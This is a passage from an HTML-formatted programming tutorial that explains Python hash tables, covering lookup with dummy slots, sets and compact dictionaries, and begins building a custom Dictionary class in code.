&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;        hashvalue &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hash(key)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3&lt;/span&gt;        index, elem &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lookup(key, hashvalue)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; elem &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; None &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; elem &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; DUMMY:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyError&lt;/span&gt;(key)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;6&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; table[index]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As I&amp;rsquo;ve mentioned before, the &lt;code&gt;DUMMY&lt;/code&gt; and &lt;code&gt;None&lt;/code&gt; handling is done within the caller - while this specific method raises a &lt;code&gt;KeyError&lt;/code&gt;, other operations could have still used that index as you will soon see.&lt;/p&gt;
&lt;div class=&#34;toast add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Comprehension Check&lt;/p&gt;
		&lt;p class=&#34;toast__message dark-text&#34;&gt;
			Would the insertion operation use the index received from the lookup method even if the element is &lt;code&gt;None&lt;/code&gt; or &lt;code&gt;DUMMY&lt;/code&gt;?
		&lt;/p&gt;
		&lt;div class=&#34;toggle-solution&#34; id=&#34;dummy&#34;&gt;Show Solution&lt;/div&gt;
		&lt;div class=&#34;solution dark-text&#34; id=&#34;solution-dummy&#34;&gt;
			Yes! The insertion method would be happy to receive an empty slot - It means that no hash collisions were involved in the process.
		&lt;/div&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;h3 id=&#34;understanding-python-sets&#34;&gt;Understanding Python Sets&lt;/h3&gt;
&lt;p&gt;Along with dictionaries, Python hash tables also serve as the underlying structure for sets. Both implementations are quite similar as can be seen in the &lt;a href=&#34;https://github.com/python/cpython/blob/master/Objects/setobject.c&#34;&gt;source code&lt;/a&gt;, with the exception that sets do not store a value for each key, meaning the optimizations of Python, which are shown &lt;a href=&#34;#exploring-python-hash-tables-optimizations&#34;&gt;later&lt;/a&gt; in this article, are not applicable for them. The usage of hash tables for sets make the lookup operation, which is used frequently in sets in order to keep them without duplicates, quite fast (as you should know by now - It always depends on the collisions).&lt;/p&gt;
&lt;h2 id=&#34;exploring-python-hash-tables-optimizations&#34;&gt;Exploring Python Hash Tables Optimizations&lt;/h2&gt;
&lt;p&gt;The methods above are not entirely identical to Python&amp;rsquo;s. I didn&amp;rsquo;t want to overcomplicate things, so I&amp;rsquo;ve left out some details that make the Python dictionary blazing fast. The following section will guide you through building a custom dictionary, implementing the optimizations of Python hash tables.&lt;/p&gt;
&lt;p&gt;Your first step would be to create a &lt;code&gt;Dictionary&lt;/code&gt; class:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Dictionary&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;Dict initializiation&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;@staticmethod&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_generate_probes&lt;/span&gt;(hash_: int, mask: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Iterable[int]:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;            index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hash_ &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; mask
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; index
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;            perturb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hash_
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; True:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;                new_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; perturb
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; new_hash &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; mask
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14&lt;/span&gt;                perturb &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_lookup&lt;/span&gt;(self, key: Any, hashvalue: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Tuple[int, Any]:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17&lt;/span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;The lookup method&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __getitem__(self, key: Any) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Any:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20&lt;/span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;Get value from dict&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __setitem__(self, key: Any, value: Any):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;23&lt;/span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;Insert item to dict&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;24&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;25&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __delitem__(self, key: Any):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;26&lt;/span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;Delete item from dict&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;27&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;28&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __len__(self) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; int:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;29&lt;/span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;Dict length&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;30&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;31&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __iter__(self) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Iterable:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;32&lt;/span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;Iterate through dictionary&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;33&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;34&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __contains__(self, key: Any) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; bool:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;35&lt;/span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;Check if dictionary contains a key&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;36&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;37&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __repr__(self) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; str:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;38&lt;/span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;Dict representation&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You will soon fill up these methods. Notice that &lt;code&gt;generate_probes&lt;/code&gt; is now a static method - No reason for it to be an instance method since it does not use any instance attributes. &lt;code&gt;lookup&lt;/code&gt; and &lt;code&gt;search&lt;/code&gt; from before are not used since they both will change quite a bit.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s dive into Python hash tables optimizations!&lt;/p&gt;
&lt;h3 id=&#34;compact-dictionaries&#34;&gt;Compact Dictionaries&lt;/h3&gt;
&lt;p&gt;Compact dictionaries optimize the space that hash tables occupy. Before they were implemented, Python has had sparse hash tables - Each unoccupied slot took as much space as an occupied slot because it had to save space for the key, hash and value. Compact dictionaries introduced a much smaller table just for indices, and a separate table for the keys, values and hashes. This way, the indices table could be the sparse one while the bigger table is dense.&lt;/p&gt;
&lt;p&gt;For example, before compact dictionaries, the following is how a dictionary and its corresponding memory array looked like (&lt;a href=&#34;https://mail.python.org/pipermail/python-dev/2012-December/123028.html&#34;&gt;taken from Raymond Hettinger&amp;rsquo;s text&lt;/a&gt;):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;timmy&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;red&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;barry&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;green&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;guido&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;}

[[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;],
    [&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8522787127447073495&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;barry&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;green&amp;#39;&lt;/span&gt;],
    [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;],
    [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;],
    [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;],
    [&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9092791511155847987&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;timmy&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;red&amp;#39;&lt;/span&gt;],
    [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;---&amp;#39;&lt;/span&gt;],
    [&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6480567542315338377&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;guido&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;]]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Instead, with compact dictionaries, two different tables are built:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;[None, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, None, None, None, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, None, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]

[[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9092791511155847987&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;timmy&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;red&amp;#39;&lt;/span&gt;],
    [&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8522787127447073495&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;barry&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;green&amp;#39;&lt;/span&gt;],
    [&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6480567542315338377&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;guido&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;]]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Take &lt;em&gt;Timmy&lt;/em&gt; for example. It gets hashed into the 5th index, which contains the number &lt;code&gt;0&lt;/code&gt; in the indices table, which in turn contains the actual &lt;em&gt;timmy&lt;/em&gt; element in the entries table.&lt;/p&gt;
&lt;p&gt;Raymond Hettinger, the creator of compact dictionaries, said:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The memory savings are significant (from 30% to 95% compression depending on the how full the table is).&lt;/p&gt;
&lt;p&gt;In addition to space savings, the new memory layout makes iteration faster. keys/values/items can loop directly over the dense table, using fewer memory accesses.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/AdamGold/materials/blob/patch-1/python-hash-tables/python_dict_sizes.py&#34;&gt;This piece of code&lt;/a&gt; inserts new elements to a dictionary, and checks the size after each insertion until it reaches 1000 elements. Here&amp;rsquo;s how Python 3.8 compact dictionary sizes compare to Python 2.7 non-compact dictionaries:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Number of keys&lt;/th&gt;
&lt;th&gt;3.8 Size&lt;/th&gt;
&lt;th&gt;2.7 Size&lt;/th&gt;
&lt;th&gt;Multiplier&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&amp;lt; 6&lt;/td&gt;
&lt;td&gt;232&lt;/td&gt;
&lt;td&gt;280&lt;/td&gt;
&lt;td&gt;1.2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;lt; 11&lt;/td&gt;
&lt;td&gt;360&lt;/td&gt;
&lt;td&gt;1048&lt;/td&gt;
&lt;td&gt;2.9&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;lt; 22&lt;/td&gt;
&lt;td&gt;640&lt;/td&gt;
&lt;td&gt;1048&lt;/td&gt;
&lt;td&gt;1.6&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;lt; 43&lt;/td&gt;
&lt;td&gt;1176&lt;/td&gt;
&lt;td&gt;3352&lt;/td&gt;
&lt;td&gt;2.8&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;lt; 86&lt;/td&gt;
&lt;td&gt;2272&lt;/td&gt;
&lt;td&gt;3352&lt;/td&gt;
&lt;td&gt;1.5&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;lt; 171&lt;/td&gt;
&lt;td&gt;4696&lt;/td&gt;
&lt;td&gt;12568&lt;/td&gt;
&lt;td&gt;2.5&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;lt; 342&lt;/td&gt;
&lt;td&gt;9312&lt;/td&gt;
&lt;td&gt;12568&lt;/td&gt;
&lt;td&gt;1.3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;lt; 683&lt;/td&gt;
&lt;td&gt;18520&lt;/td&gt;
&lt;td&gt;49432&lt;/td&gt;
&lt;td&gt;2.7&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&amp;lt; 1000&lt;/td&gt;
&lt;td&gt;36960&lt;/td&gt;
&lt;td&gt;49432&lt;/td&gt;
&lt;td&gt;1.3&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;In order to implement this feature in your custom dictionary, the dictionary needs to implement two separates arrays: one for the indices and one for the actual entries. Before you do that, there are other optimizations to consider, therefore the final implementation will take place soon, in &lt;a href=&#34;#putting-it-all-together&#34;&gt;&lt;em&gt;Putting it All Together&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Meanwhile, you can create the method that builds the indices array, and initialize the class with &lt;code&gt;indices&lt;/code&gt;, &lt;code&gt;filled&lt;/code&gt; and &lt;code&gt;used&lt;/code&gt; variables:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;    FREE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;    DUMMY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Dictionary&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;indices &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_make_index_array(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# Init with an 8 elements table&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;used &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# Number of items in the dictionary&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filled &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# Number of non-empty slots including dummy slots&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;@staticmethod&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_make_index_array&lt;/span&gt;(n: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Union[list, array&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array]:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; n &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;:
